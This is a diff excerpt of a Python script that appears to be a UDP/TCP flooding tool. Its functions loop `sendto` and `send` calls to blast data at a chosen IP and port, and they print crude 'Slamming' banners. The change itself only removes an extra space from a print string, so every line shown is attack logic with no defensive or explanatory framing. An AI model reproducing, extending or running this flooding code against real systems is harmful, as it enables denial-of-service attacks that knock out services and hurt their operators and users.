@@ -67,7 +67,7 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" \u001b[31mThread initiated|\u001b[35mSlamming  %s:%s|\u001b[31mGetPieced Slapped that hoe"%(ip,port))
+			print(i +" \u001b[31mThread initiated|\u001b[35mSlamming %s:%s|\u001b[31mGetPieced Slapped that hoe"%(ip,port))
 		except:
 			print("[ 1 ] Down!!!")
 
@@ -81,7 +81,7 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +" \u001b[31mThread initiated|\u001b[35mSlamming  %s:%s|\u001b[31mGetPieced Slapped that hoe"%(ip,port))
+			print(i +" \u001b[31mThread initiated|\u001b[35mSlamming %s:%s|\u001b[31mGetPieced Slapped that hoe"%(ip,port))
 		except:
 			s.close()
 			print("[ 2 ] Down")
